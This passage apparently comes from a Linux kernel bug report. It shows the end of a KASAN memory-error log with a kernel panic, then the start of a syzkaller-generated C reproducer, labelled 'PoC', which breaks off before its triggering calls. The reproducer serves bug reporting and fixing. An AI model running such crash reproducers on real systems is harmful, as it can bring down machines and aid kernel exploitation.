 ^\n[  144.288617]  ffff880071feef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[  144.290465]  ffff880071fef000: 00 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2\n[  144.292215] ==================================================================\n[  144.296633] Disabling lock debugging due to kernel taint\n[  144.297823] Kernel panic - not syncing: panic_on_warn set ...\n```\n\n### PoC\n\ngenerated by syz-repro.\n\n```c\n#define _GNU_SOURCE\n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <linux/futex.h>\n#include <pthread.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <errno.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/prctl.h>\n#include <sys/resource.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <grp.h>\n#include <arpa/inet.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <linux/if.h>\n#include <linux/if_ether.h>\n#include <linux/if_tun.h>\n#include <linux/ip.h>\n#include <linux/tcp.h>\n#include <net/if_arp.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/uio.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\n  static void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\n  static void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void vsnprintf_check(char* str, size_t size, const char* format, va_list args)\n{\n\tint rv;\n\n\trv = vsnprintf(str, size, format, args);\n\tif (rv < 0)\n\t\tfail(\"tun: snprintf failed\");\n\tif ((size_t)rv >= size)\n\t\tfail(\"tun: string '%s...' doesn't fit into buffer\", str);\n}\n\nstatic void snprintf_check(char* str, size_t size, const char* format, ...)\n{\n\tva_list args;\n\n\tva_start(args, format);\n\tvsnprintf_check(str, size, format, args);\n\tva_end(args);\n}\n\n#define COMMAND_MAX_LEN 128\n#define PATH_PREFIX \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \"\n#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)\n\nstatic void execute_command(bool panic, const char* format, ...)\n{\n\tva_list args;\n\tchar command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];\n\tint rv;\n\n\tva_start(args, format);\n\tmemcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);\n\tvsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);\n\trv = system(command);\n\tif (panic && rv != 0)\n\t\tfail(\"tun: command \\\"%s\\\" failed with code %d\", &command[0], rv);\n\n\tva_end(args);\n}\n\nstatic int tunfd = -1;\nstatic int tun_frags_enabled;\n\n#define SYZ_TUN_MAX_PACKET_SIZE 1000\n\n#define TUN_IFACE \"syz_tun\"\n\n#define LOCAL_MAC \"aa:aa:aa:aa:aa:aa\"\n#define REMOTE_MAC \"aa:aa:aa:aa:aa:bb\"\n\n#define LOCAL_IPV4 \"172.20.20.170\"\n#define REMOTE_IPV4 \"172.20.20.187\"\n\n#define LOCAL_IPV6 \"fe80::aa\"\n#define REMOTE_IPV6 \"fe80::bb\"\n\n#define IFF_NAPI 0x0010\n#define IFF_NAPI_FRAGS 0x0020\n\nstatic void initialize_tun(void)\n{\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\n\tif (tunfd == -1) {\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\n\t\treturn;\n\t}\n\tconst int kTunFd = 252;\n\tif (dup2(tunfd, kTunFd) < 0)\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\n\tclose(tunfd);\n\ttunfd = kTunFd;\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\n\t}\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\n\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\n}\n\n#define DEV_IPV4 \"172.20.20.%d\"\n#define DEV_IPV6 \"fe80::%02hx\"\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\n\nstatic void initialize_netdevices(void)\n{\n\tunsigned i;\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", \"ip6_vti0\",\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\n\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\n\texecute_command(0, \"ip link add dev veth1 type veth\");\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\n\t\tchar addr[32];\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\n\t}\n}\n\nstatic int read_tun(char* data, int size)\n{\n\tif (tunfd < 0)\n\t\treturn -1;\n\n\tint rv = read(tunfd, data, size);\n\tif (rv < 0) {\n\t\tif (errno == EAGAIN)\n\t\t\treturn -1;\n\t\tif (errno == EBADFD)\n\t\t\treturn -1;\n\t\tfail(\"tun: read failed with %d\", rv);\n\t}\n\treturn rv;\n}\n\nstatic void flush_tun()\n{\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\n\t\t;\n}\n\nstatic void loop();\n\nstatic void sandbox_common()\n{\n\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\tsetpgrp();\n\tsetsid();\n\n\tstruct rlimit rlim;\n\trlim.rlim_cur = rlim.rlim_max = 128 << 20;\n\tsetrlimit(RLIMIT_AS, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 8 << 20;\n\tsetrlimit(RLIMIT_MEMLOCK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_FSIZE, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_STACK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 0;\n\tsetrlimit(RLIMIT_CORE, &rlim);\n\n#define CLONE_NEWCGROUP 0x02000000\n\n\tif (unshare(CLONE_NEWNS)) {\n\t}\n\tif (unshare(CLONE_NEWIPC)) {\n\t}\n\tif (unshare(CLONE_NEWCGROUP)) {\n\t}\n\tif (unshare(CLONE_NEWUTS)) {\n\t}\n\tif (unshare(CLONE_SYSVSEM)) {\n\t}\n}\n\nstatic int do_sandbox_setuid(void)\n{\n\tif (unshare(CLONE_NEWPID))\n\t\tfail(\"unshare(CLONE_NEWPID)\");\n\tint pid = fork();\n\tif (pid < 0)\n\t\tfail(\"sandbox fork failed\");\n\tif (pid)\n\t\treturn pid;\n\n\tsandbox_common();\n\tif (unshare(CLONE_NEWNET))\n\t\tfail(\"unshare(CLONE_NEWNET)\");\n\tinitialize_tun();\n\tinitialize_netdevices();\n\n\tconst int nobody = 65534;\n\tif (setgroups(0, NULL))\n\t\tfail(\"failed to setgroups\");\n\tif (syscall(SYS_setresgid, nobody, nobody, nobody))\n\t\tfail(\"failed to setresgid\");\n\tif (syscall(SYS_setresuid, nobody, nobody, nobody))\n\t\tfail(\"failed to setresuid\");\n\n\tprctl(PR_SET_DUMPABLE, 1, 0, 0, 0);\n\n\tloop();\n\tdoexit(1);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop()\n{\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\tflush_tun();\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) 